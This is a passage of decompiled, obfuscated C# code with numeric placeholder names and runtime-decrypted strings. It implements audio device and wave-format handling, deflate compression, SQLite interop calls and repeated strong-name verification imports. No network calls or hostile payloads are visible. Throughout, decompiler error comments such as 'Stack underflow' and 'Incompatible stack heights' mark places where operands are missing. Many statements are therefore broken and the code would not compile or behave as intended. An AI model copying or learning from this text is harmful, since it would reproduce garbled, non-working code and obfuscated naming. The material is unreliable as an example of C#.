				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmDriverClose")]
		static extern MmResult _0001(IntPtr _0002, int _0003);

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerMessage")]
		static extern MmResult _0001(IntPtr _0002, uint _0003, IntPtr _0004, IntPtr _0005);

		static void _0001(global::_0013._0017 _0002, bool P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			if (((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				return;
			}
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				if (((global::_0013._0017)/*Error near IL_0014: Stack underflow*/)._0001 != null)
				{
					global::_0008._007E_0007_0002(_0002._0001);
					_0002._0001 = null;
				}
				_0002._0001 = null;
				_0002._0001 = null;
				_0002._0001 = null;
				_0002._0001 = null;
			}
			_0002._0001 = true;
		}

		static bool _0001(double _0002, global::_0017._0015 P_1)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			_ = ((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001;
			AsioError asioError = /*Error near IL_001a: Stack underflow*/((IntPtr)/*Error near IL_001a: Stack underflow*/, (double)/*Error near IL_001a: Stack underflow*/);
			switch (asioError)
			{
			case AsioError.ASE_NoClock:
				return false;
			case AsioError.ASE_OK:
				return true;
			default:
				_0018._0001(P_1, asioError, _0080._0014._0001(107355511));
				return false;
			}
		}

		static object[] _0001(int _0002, global::_0012._0014 _0003, IntPtr P_2)
		{
			//IL_0170: Incompatible stack heights: 0 vs 1
			//IL_017c: Incompatible stack heights: 0 vs 1
			object[] array = new object[/*Error near IL_000a: Stack underflow*/];
			IntPtr[] array2 = new IntPtr[/*Error near IL_0019: Stack underflow*/];
			_0001_0006._0094_000F(P_2, array2, 0, _0002);
			for (int i = 0; i < _0002; i++)
			{
				switch (_0003._0001._0001(array2[i]))
				{
				case global::_0014._0017._0006:
					array[i] = DBNull.Value;
					break;
				case global::_0014._0017._0002:
					array[i] = _0003._0001._0001(array2[i]);
					break;
				case global::_0014._0017._0003:
					array[i] = _0003._0001._0001(array2[i]);
					break;
				case global::_0014._0017._0004:
					array[i] = _0003._0001._0001(array2[i]);
					break;
				case global::_0014._0017._0005:
				{
					int num = (int)_0003._0001._0001(array2[i], 0, null, 0, 0);
					byte[] array3 = new byte[num];
					_0003._0001._0001(array2[i], 0, array3, 0, num);
					array[i] = array3;
					break;
				}
				case global::_0014._0017._0007:
					array[i] = _0018._0001((global::_0001._001A)_0003._0001, _0003._0001._0001(array2[i]));
					break;
				}
			}
			return array;
		}

		static global::_000E._001F _0001(int _0002, string _0003, out int _0004)
		{
			//IL_01d6: Incompatible stack heights: 0 vs 1
			//IL_01e2: Incompatible stack heights: 0 vs 1
			_0018._0001();
			global::_0007._001B obj = (global::_0007._001B)/*Error near IL_01dc: Stack underflow*/;
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0)
			{
				return obj._0001(_0003, _0002, out _0004) as global::_000E._001F;
			}
			object obj2;
			_0091_0002._009C_0005(obj2 = global::_0007._001C._0001);
			int num;
			Queue<WeakReference> queue;
			try
			{
				_0004 = global::_0007._001C._0001;
				if (!global::_0007._001C._0001.TryGetValue(_0003, out var value))
				{
					value = new global::_0007._001C._0001(global::_0007._001C._0001, _0002);
					global::_0007._001C._0001.Add(_0003, value);
					return null;
				}
				num = (_0004 = value._0001);
				value._0002 = _0002;
				_0018._0001(value, _0003: false);
				queue = value._0001;
				if (queue == null)
				{
					return null;
				}
				global::_0007._001C._0001.Remove(_0003);
				queue = new Queue<WeakReference>(queue);
			}
			finally
			{
				_0091_0002._009D_0005(obj2);
			}
			try
			{
				while (queue.Count > 0)
				{
					WeakReference weakReference = queue.Dequeue();
					if (weakReference == null || !(_0083_0003._007E_001A_0007(weakReference) is global::_000E._001F obj3))
					{
						continue;
					}
					_0091_0002._009B_0005(obj3);
					try
					{
						_008A._0016_0004();
						if (!global::_001B._007E_008A_0003(obj3) && !global::_001B._007E_008B_0003(obj3))
						{
							_0006_0003._0084_0006(ref global::_0007._001C._0002);
							return obj3;
						}
					}
					finally
					{
						_0091_0002._0001_0006(obj3);
					}
					_0091_0002._009E_0005(obj3);
				}
			}
			finally
			{
				object obj4;
				_0091_0002._009C_0005(obj4 = global::_0007._001C._0001);
				try
				{
					bool flag;
					if (global::_0007._001C._0001.TryGetValue(_0003, out var value2))
					{
						flag = false;
					}
					else
					{
						flag = true;
						value2 = new global::_0007._001C._0001(num, _0002);
					}
					Queue<WeakReference> queue2 = value2._0001;
					while (queue.Count > 0)
					{
						queue2.Enqueue(queue.Dequeue());
					}
					_0018._0001(value2, _0003: false);
					if (flag)
					{
						global::_0007._001C._0001.Add(_0003, value2);
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj4);
				}
			}
			return null;
		}

		static void _0001(global::_0013._0017 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0013._0017).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static byte[] _0001(double _0002)
		{
			//IL_000e: Invalid comparison between Unknown and F8
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Expected F8, but got Unknown
			//IL_0147: Incompatible stack heights: 0 vs 1
			//IL_0153: Incompatible stack heights: 0 vs 1
			int num;
			if (!((double)/*Error near IL_0010: Stack underflow*/ >= 0.0))
			{
				if (8u != 0)
				{
					num = 32768;
				}
				_0002 = /*Error near IL_002b: Stack underflow*/* -1.0;
			}
			else
			{
				num = 0;
			}
			ulong num3;
			ulong num4;
			int num2;
			if (_0002 == 0.0)
			{
				num2 = 0;
				num3 = 0uL;
				num4 = 0uL;
			}
			else
			{
				double num5 = _0018._0001(_0002, out num2);
				if (num2 > 16384 || !(num5 < 1.0))
				{
					num2 = num | 0x7FFF;
					num3 = 0uL;
					num4 = 0uL;
				}
				else
				{
					num2 += 16382;
					if (num2 < 0)
					{
						num5 = _0018._0001(num5, num2);
						num2 = 0;
					}
					num2 |= num;
					num5 = _0018._0001(num5, 32);
					double num6 = global::_0015._0098_0002(num5);
					num3 = (ulong)((long)(num6 - 2147483648.0) + int.MaxValue + 1);
					num5 = _0018._0001(num5 - num6, 32);
					num6 = global::_0015._0098_0002(num5);
					num4 = (ulong)((long)(num6 - 2147483648.0) + int.MaxValue + 1);
				}
			}
			return new byte[10]
			{
				(byte)(num2 >> 8),
				(byte)num2,
				(byte)(num3 >> 24),
				(byte)(num3 >> 16),
				(byte)(num3 >> 8),
				(byte)num3,
				(byte)(num4 >> 24),
				(byte)(num4 >> 16),
				(byte)(num4 >> 8),
				(byte)num4
			};
		}

		static bool _0001(int _0002, _001B._0004 _0003, _001E._0004 P_2)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0014: Incompatible stack heights: 0 vs 1
			_ = 1;
			return _0018._0001((int)/*Error near IL_000c: Stack underflow*/, (global::_0017._0005)/*Error near IL_000c: Stack underflow*/, (_001E._0004)/*Error near IL_000c: Stack underflow*/, (_001B._0004)/*Error near IL_000c: Stack underflow*/);
		}

		static void _0001(int _0002, int _0003, IntPtr _0004)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			_ = _009A_0005._008C_000F;
			/*Error near IL_0010: Stack underflow*/((IntPtr)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0002._0007 _0001(_001C._0004 _0002)
		{
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			//IL_00da: Incompatible stack heights: 0 vs 1
			_ = ((_001C._0004)/*Error near IL_00d4: Stack underflow*/).WaveFormat;
			if (((global::_0005._0005)/*Error near IL_000f: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm)
			{
				if (((_001C._0004)/*Error near IL_001c: Stack underflow*/).WaveFormat._0003 == 8)
				{
					return new global::_000E._0010(_0002);
				}
				if (_0002.WaveFormat._0003 == 16)
				{
					return new global::_0003._0007(_0002);
				}
				if (_0002.WaveFormat._0003 == 24)
				{
					return new _007F._000F(_0002);
				}
				if (_0002.WaveFormat._0003 == 32)
				{
					return new global::_0017._0010(_0002);
				}
				throw new InvalidOperationException(_0080._0014._0001(107355458));
			}
			if (_0002.WaveFormat._0001 == WaveFormatEncoding.IeeeFloat)
			{
				if (_0002.WaveFormat._0003 == 64)
				{
					return new global::_0001._000E(_0002);
				}
				return new _001A._0006(_0002);
			}
			throw new ArgumentException(_0080._0014._0001(107355429));
		}

		static global::_0018._0003 _0001(global::_000E._0005 P_0)
		{
			//IL_0049: Incompatible stack heights: 0 vs 2
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._0099_0005;
			IntPtr intPtr = ((global::_000E._0005)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0050: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return new global::_0018._0003(((global::_000E._0005)/*Error near IL_001c: Stack underflow*/)._0001, 0, _001D._0001._0007);
			}
			return new global::_0018._0003(_0099._008E_0004(P_0.DeviceNumber), 0, _001D._0001._0006);
		}

		static bool _0001(bool _0002, bool _0003, global::_0017._007F._0008 P_2)
		{
			//IL_02a8: Incompatible stack heights: 0 vs 1
			//IL_02ae: Incompatible stack heights: 0 vs 1
			//IL_02b4: Incompatible stack heights: 0 vs 1
			if (((global::_0017._007F._0008)/*Error near IL_000a: Stack underflow*/)._0015 < 262 && (int)/*Error near IL_001e: Stack underflow*/ == 0)
			{
				return false;
			}
			while (P_2._0015 >= 262 || _0003)
			{
				if (((global::_0017._007F._0008)/*Error near IL_002a: Stack underflow*/)._0015 == 0)
				{
					if (P_2._0001)
					{
						global::_0017._007F._0007 obj = P_2._0001;
						int num = P_2._0001[P_2._0014 - 1] & 0xFF;
						_0018._0001(num, obj);
					}
					P_2._0001 = false;
					global::_0017._007F._0007 obj2 = P_2._0001;
					byte[] array = P_2._0001;
					int num2 = P_2._0013;
					int num3 = P_2._0014 - P_2._0013;
					_0018._0001(num2, num3, array, _0002, obj2);
					P_2._0013 = P_2._0014;
					return false;
				}
				if (P_2._0014 >= 65274)
				{
					_0018._0001(P_2);
				}
				int num4 = P_2._0011;
				int num5 = P_2._0012;
				if (P_2._0015 >= 3)
				{
					int num6 = _0018._0001(P_2);
					if (num6 != 0 && P_2._0014 - num6 <= 32506 && _0018._0001(num6, P_2) && P_2._0012 <= 5 && P_2._0012 == 3 && P_2._0014 - P_2._0011 > 4096)
					{
						P_2._0012 = 2;
					}
				}
				if (num5 >= 3 && P_2._0012 <= num5)
				{
					global::_0017._007F._0007 obj3 = P_2._0001;
					int num7 = P_2._0014 - 1 - num4;
					_0018._0001(num5, obj3, num7);
					num5 -= 2;
					do
					{
						P_2._0014++;
						P_2._0015--;
						if (P_2._0015 >= 3)
						{
							_0018._0001(P_2);
						}
					}
					while (--num5 > 0);
					P_2._0014++;
					P_2._0015--;
					P_2._0001 = false;
					P_2._0012 = 2;
				}
				else
				{
					if (P_2._0001)
					{
						global::_0017._007F._0007 obj = P_2._0001;
						int num = P_2._0001[P_2._0014 - 1] & 0xFF;
						_0018._0001(num, obj);
					}
					P_2._0001 = true;
					P_2._0014++;
					P_2._0015--;
				}
				if (P_2._0001._000E >= 16384)
				{
					int num8 = P_2._0014 - P_2._0013;
					if (P_2._0001)
					{
						num8--;
					}
					bool flag = _0002 && P_2._0015 == 0 && !P_2._0001;
					global::_0017._007F._0007 obj2 = P_2._0001;
					byte[] array = P_2._0001;
					int num2 = P_2._0013;
					_0018._0001(num2, num8, array, flag, obj2);
					P_2._0013 += num8;
					return !flag;
				}
			}
			return true;
		}

		static bool _0001(long _0002)
		{
			//IL_0007: Invalid comparison between Unknown and I8
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			long num = global::_0001._001A._0001;
			if ((long)/*Error near IL_0009: Stack underflow*/ >= num)
			{
				long num2 = global::_0001._001A._0002;
				return (long)/*Error near IL_0012: Stack underflow*/ <= num2;
			}
			return false;
		}

		static global::_0006._0012 _0001(global::_0015._0013 _0002, int P_1)
		{
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0024: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((global::_0015._0013)/*Error near IL_000c: Stack underflow*/)._0001;
			((_001E._0012)/*Error near IL_0024: Stack underflow*/)._0001((int)/*Error near IL_0024: Stack underflow*/, out global::_0006._0012 result);
			/*Error near IL_0017: Stack underflow*/((int)/*Error near IL_0017: Stack underflow*/);
			return result;
		}

		static void _0001(global::_0017._007F._0007._0001 P_0)
		{
			//IL_00ab: Incompatible stack heights: 0 vs 1
			//IL_00b1: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._007F._0007._0001)/*Error near IL_000a: Stack underflow*/)._0001.Length;
			int[] array = new int[((global::_0017._007F._0007._0001)/*Error near IL_0017: Stack underflow*/)._0003];
			int num = 0;
			P_0._0002 = new short[P_0._0001.Length];
			for (int i = 0; i < P_0._0003; i++)
			{
				array[i] = num;
				num += P_0._0001[i] << 15 - i;
			}
			for (int j = 0; j < P_0._0002; j++)
			{
				int num2 = P_0._0001[j];
				if (num2 > 0)
				{
					P_0._0002[j] = _0018._0001(array[num2 - 1]);
					array[num2 - 1] += 1 << 16 - num2;
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(int _0002, global::_0001._001F _0003, ValueType _0004)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001((global::_0001._001F)/*Error near IL_0059: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_005c: Stack underflow*/;
			_0018._0001(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107355831), new object[4]
			{
				intPtr,
				_0002,
				_001D_0003._007E_009D_0006(_0004),
				_0004
			}));
		}

		static _001F._0018 _0001(_0014 _0002, SQLiteConnectionFlags _0003, int P_2)
		{
			//IL_0086: Incompatible stack heights: 0 vs 1
			//IL_008c: Incompatible stack heights: 0 vs 2
			_ = ((_0014)/*Error near IL_000a: Stack underflow*/)._0001;
			_001F._0018 obj = (_001F._0018)((object[])/*Error near IL_0010: Stack underflow*/)[/*Error near IL_0010: Stack underflow*/];
			if (obj == null)
			{
				obj = (_0002._0001[P_2] = new _001F._0018());
			}
			if (obj._0001 == global::_0014._0017._0001)
			{
				_001F._0018 obj2 = obj;
				global::_0017._0080 obj3 = _0018._0001(_0002);
				string text = _0002._0001._0001._0001(_0002._0001, P_2, ref obj._0001);
				obj2._0001 = _0018._0001(_0003, obj3, text);
			}
			else
			{
				obj._0001 = _0002._0001._0001._0001(_0002._0001, P_2);
			}
			return obj;
		}

		static void _0001(int _0002, int _0003, byte[] _0004, bool _0005, global::_0017._007F._0007 P_4)
		{
			//IL_01e9: Incompatible stack heights: 0 vs 1
			//IL_01f0: Incompatible stack heights: 0 vs 1
			((global::_0017._007F._0007)/*Error near IL_000a: Stack underflow*/)._0001._0001[256]++;
			_0018._0001(((global::_0017._007F._0007)/*Error near IL_0029: Stack underflow*/)._0001);
			_0018._0001(P_4._0002);
			_0018._0001(P_4._0001, P_4._0003);
			_0018._0001(P_4._0002, P_4._0003);
			_0018._0001(P_4._0003);
			int num = 4;
			for (int num2 = 18; num2 > num; num2--)
			{
				if (P_4._0003._0001[global::_0017._007F._0007._0001[num2]] > 0)
				{
					num = num2 + 1;
				}
			}
			int num3 = 14 + num * 3 + _0018._0001(P_4._0003) + _0018._0001(P_4._0001) + _0018._0001(P_4._0002) + P_4._000F;
			int num4 = P_4._000F;
			for (int i = 0; i < 286; i++)
			{
				num4 += P_4._0001._0001[i] * global::_0017._007F._0007._0003[i];
			}
			for (int j = 0; j < 30; j++)
			{
				num4 += P_4._0002._0001[j] * global::_0017._007F._0007._0004[j];
			}
			if (num3 >= num4)
			{
				num3 = num4;
			}
			if (_0002 >= 0 && _0003 + 4 < num3 >> 3)
			{
				_0018._0001(_0003, _0004, _0002, _0005, P_4);
			}
			else if (num3 == num4)
			{
				_0018._0001(P_4._0001, 2 + (_0005 ? 1 : 0), 3);
				global::_0017._007F._0007._0001 obj = P_4._0001;
				short[] array = global::_0017._007F._0007._0002;
				byte[] array2 = global::_0017._007F._0007._0003;
				_0018._0001(array2, array, obj);
				obj = P_4._0002;
				array = global::_0017._007F._0007._0003;
				array2 = global::_0017._007F._0007._0004;
				_0018._0001(array2, array, obj);
				_0018._0001(P_4);
				_0018._0001(P_4);
			}
			else
			{
				_0018._0001(P_4._0001, 4 + (_0005 ? 1 : 0), 3);
				_0018._0001(P_4, num);
				_0018._0001(P_4);
				_0018._0001(P_4);
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutShortMsg")]
		static extern MmResult _0001(IntPtr _0002, int _0003);

		static void _0001(_001E._0004 _0002, int P_1)
		{
			//IL_0017: Incompatible stack heights: 0 vs 2
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_0021: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			((global::_0013._0005)/*Error near IL_0021: Stack underflow*/)._0001((int)/*Error near IL_0021: Stack underflow*/);
			/*Error near IL_0015: Stack underflow*/((int)/*Error near IL_0015: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._007F._0003 _0002, int _0003, int P_2)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I4, but got Unknown
			//IL_001c: Expected I4, but got Unknown
			//IL_00b3: Incompatible stack heights: 0 vs 1
			//IL_00b9: Incompatible stack heights: 0 vs 1
			//IL_00bf: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0003)/*Error near IL_000f: Stack underflow*/)._0004;
			_003F val = /*Error near IL_0015: Stack underflow*/+ /*Error near IL_0015: Stack underflow*/;
			int num = (int)val;
			((global::_0017._007F._0003)/*Error near IL_001c: Stack underflow*/)._0004 = (int)val;
			if (num > 32768)
			{
				throw new InvalidOperationException();
			}
			int num2 = (_0002._0003 - P_2) & 0x7FFF;
			int num3 = 32768 - _0003;
			if (num2 <= num3 && _0002._0003 < num3)
			{
				if (_0003 <= P_2)
				{
					Array.Copy(_0002._0001, num2, _0002._0001, _0002._0003, _0003);
					_0002._0003 += _0003;
				}
				else
				{
					while (_0003-- > 0)
					{
						_0002._0001[_0002._0003++] = _0002._0001[num2++];
					}
				}
			}
			else
			{
				_0018._0001(_0002, num2, _0003, P_2);
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_error_nomem")]
		static extern void _0001(IntPtr _0002);

		static bool _0001(string _0002)
		{
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			_0018._0001();
			((IEnumerable<global::_0014._0008>)/*Error near IL_0057: Stack underflow*/).GetEnumerator();
			IEnumerator<global::_0014._0008> enumerator = (IEnumerator<global::_0014._0008>)/*Error near IL_005a: Stack underflow*/;
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					if (_0010_0003._008B_0006(enumerator.Current._0001._0001, _0002))
					{
						return true;
					}
				}
			}
			finally
			{
				if (enumerator != null)
				{
					global::_0008._007E_0098(enumerator);
				}
			}
			return false;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static float[] _0001(_001C._0007 P_0)
		{
			//IL_001c: Invalid comparison between Unknown and I4
			//IL_019d: Incompatible stack heights: 0 vs 1
			//IL_01ab: Incompatible stack heights: 0 vs 1
			WaveFormatEncoding num = ((_001C._0007)/*Error near IL_000a: Stack underflow*/)._0001._0001;
			WaveFormatEncoding waveFormatEncoding = default(WaveFormatEncoding);
			if (0 == 0)
			{
				waveFormatEncoding = num;
			}
			if ((int)/*Error near IL_001e: Stack underflow*/ != 1 && waveFormatEncoding != WaveFormatEncoding.IeeeFloat && waveFormatEncoding != WaveFormatEncoding.Extensible)
			{
				throw new InvalidOperationException(_0080._0014._0001(107355392));
			}
			float[] array = new float[P_0._0001._0001];
			int num2 = P_0._0001._0001 * (P_0._0001._0003 / 8);
			byte[] array2 = new byte[num2];
			int num3 = _0082._007E_0006_0004(P_0, array2, 0, num2);
			if (num3 == 0)
			{
				return null;
			}
			if (num3 < num2)
			{
				throw new InvalidDataException(_0080._0014._0001(107354799));
			}
			int num4 = 0;
			for (int i = 0; i < P_0._0001._0001; i++)
			{
				if (P_0._0001._0003 == 16)
				{
					array[i] = (float)_0080_0002._0086_0005(array2, num4) / 32768f;
					num4 += 2;
					continue;
				}
				if (P_0._0001._0003 == 24)
				{
					array[i] = (float)(((sbyte)array2[num4 + 2] << 16) | (array2[num4 + 1] << 8) | array2[num4]) / 8388608f;
					num4 += 3;
					continue;
				}
				if (P_0._0001._0003 == 32 && P_0._0001._0001 == WaveFormatEncoding.IeeeFloat)
				{
					array[i] = _0018_0003._0094_0006(array2, num4);
					num4 += 4;
					continue;
				}
				if (P_0._0001._0003 == 32)
				{
					array[i] = (float)_0002_0006._0095_000F(array2, num4) / 2.1474836E+09f;
					num4 += 4;
					continue;
				}
				throw new InvalidOperationException(_0080._0014._0001(107355458));
			}
			return array;
		}

		static global::_0007._0014 _0001(global::_0010._0019 P_0)
		{
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((global::_0010._0019)/*Error near IL_000c: Stack underflow*/)._0001._0001(ref global::_0010._0019._0003, _001F._0017._0019, IntPtr.Zero, out var obj);
			/*Error near IL_0039: Stack underflow*/((int)/*Error near IL_0039: Stack underflow*/);
			return new global::_0007._0014(obj as _001A._0013);
		}

		static Type _0001(int _0002, _001F._0019 P_1)
		{
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_0062: Stack underflow*/);
			if (((_001F._0019)/*Error near IL_000b: Stack underflow*/)._0001[_0002]._0001 != null)
			{
				return _001A_0005._007E_0004_000F(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			return _0091._0080_0004(typeof(long).TypeHandle);
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "interop_libversion")]
		static extern IntPtr _0001();

		static void _0001(bool _0002, global::_0014._0018 _0003, IntPtr _0004)
		{
			//IL_03ba: Incompatible stack heights: 0 vs 1
			//IL_03c0: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				return;
			}
			global::_0016._001E obj = ((global::_0014._0018)/*Error near IL_0012: Stack underflow*/)._0001;
			global::_0016._001E obj2;
			if (3u != 0)
			{
				obj2 = obj;
			}
			if (obj2 == null)
			{
				return;
			}
			global::_0001._0080[] array = obj2._0001;
			if (array == null)
			{
				return;
			}
			global::_0002._001D obj3 = null;
			global::_0003._0017[] array2 = null;
			global::_0003._0018[] array3 = null;
			if (_0002)
			{
				obj3 = _0003._0001;
				if (obj3 == null)
				{
					return;
				}
				array2 = obj3._0001;
				if (array2 == null)
				{
					return;
				}
				array3 = obj3._0001;
				if (array3 == null)
				{
					return;
				}
			}
			if (_0090_0002._009A_0005(_0004, IntPtr.Zero))
			{
				return;
			}
			int num = 0;
			int num2 = _0018._0001(_0004, num);
			if ((_0002 && num2 != array2.Length) || num2 != array.Length)
			{
				return;
			}
			num = _0018._0001(num, 4, _001B_0003._0097_0006());
			if (_0002)
			{
				IntPtr intPtr = _0018._0001(_0004, num);
				int num3 = _009C_0004._0084_000E(_0091._0080_0004(typeof(global::_0017._0084._007F).TypeHandle));
				for (int i = 0; i < num2; i++)
				{
					global::_0017._0084._007F obj4 = new global::_0017._0084._007F(array2[i]);
					_009A._008F_0004(obj4, _0018._0001(intPtr, i * num3), false);
				}
			}
			num = _0018._0001(num, _001B_0003._0097_0006(), 4);
			int num4 = (_0002 ? _0018._0001(_0004, num) : 0);
			if (_0002 && num4 != array3.Length)
			{
				return;
			}
			num = _0018._0001(num, 4, _001B_0003._0097_0006());
			if (_0002)
			{
				IntPtr intPtr2 = _0018._0001(_0004, num);
				int num5 = _009C_0004._0084_000E(_0091._0080_0004(typeof(global::_0017._0084._0080).TypeHandle));
				for (int j = 0; j < num4; j++)
				{
					global::_0017._0084._0080 obj5 = new global::_0017._0084._0080(array3[j]);
					_009A._008F_0004(obj5, _0018._0001(intPtr2, j * num5), false);
				}
			}
			num = _0018._0001(num, _001B_0003._0097_0006(), _001B_0003._0097_0006());
			IntPtr intPtr3 = _0018._0001(_0004, num);
			int num6 = _009C_0004._0084_000E(_0091._0080_0004(typeof(global::_0017._0084._0081).TypeHandle));
			for (int k = 0; k < num2; k++)
			{
				global::_0017._0084._0081 obj6 = new global::_0017._0084._0081(array[k]);
				_009A._008F_0004(obj6, _0018._0001(intPtr3, k * num6), false);
			}
			num = _0018._0001(num, _001B_0003._0097_0006(), 4);
			_0018._0001(num, obj2._0001, _0004);
			num = _0018._0001(num, 4, _001B_0003._0097_0006());
			_0018._0001(num, _0004, _0018._0001(obj2._0001));
			num = _0018._0001(num, _001B_0003._0097_0006(), 4);
			int num7 = ((obj2._0002 == 0) ? 1 : obj2._0002);
			_0018._0001(num, num7, _0004);
			num = _0018._0001(num, 4, 4);
			_0018._0001(num, obj2._0003, _0004);
			num = _0018._0001(num, 4, 8);
			double? num8 = obj2._0001;
			if (num8.HasValue)
			{
				int num9 = num;
				double? num10 = obj2._0001;
				int num11 = num9;
				double valueOrDefault = num10.GetValueOrDefault();
				_0018._0001(valueOrDefault, num11, _0004);
			}
			num = _0018._0001(num, 8, 8);
			if (_0018._0001(obj2))
			{
				long? num12 = obj2._0001;
				if (num12.HasValue)
				{
					int num13 = num;
					long? num14 = obj2._0001;
					int num15 = num13;
					long valueOrDefault2 = num14.GetValueOrDefault();
					_0018._0001(num15, valueOrDefault2, _0004);
				}
			}
			num = _0018._0001(num, 8, 4);
			if (_0018._0001(obj2))
			{
				_001A._0019? obj7 = obj2._0001;
				if (obj7.HasValue)
				{
					int num16 = num;
					_001A._0019? obj8 = obj2._0001;
					int num17 = num16;
					int valueOrDefault3 = (int)obj8.GetValueOrDefault();
					_0018._0001(num17, valueOrDefault3, _0004);
				}
			}
			num = _0018._0001(num, 4, 8);
			if (_0018._0001(obj2))
			{
				long? num18 = obj2._0002;
				if (num18.HasValue)
				{
					int num19 = num;
					long? num20 = obj2._0002;
					int num15 = num19;
					long valueOrDefault2 = num20.GetValueOrDefault();
					_0018._0001(num15, valueOrDefault2, _0004);
				}
			}
		}

		static string _0001(string _0002)
		{
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			_ = global::_001C._0096_0003;
			/*Error near IL_003d: Stack underflow*/((string)/*Error near IL_003d: Stack underflow*/);
			if ((int)/*Error near IL_000b: Stack underflow*/ == 0)
			{
				_0018._0001();
